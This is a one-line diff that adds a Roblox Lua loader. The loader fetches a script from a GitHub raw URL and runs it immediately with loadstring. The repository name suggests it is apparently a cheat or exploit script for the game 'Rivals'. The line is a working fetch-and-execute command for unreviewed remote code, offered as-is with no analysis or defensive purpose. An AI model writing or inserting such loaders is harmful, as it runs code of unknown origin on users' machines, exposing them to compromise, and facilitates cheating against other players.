@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imshrak/rivals/refs/heads/main/main"))()
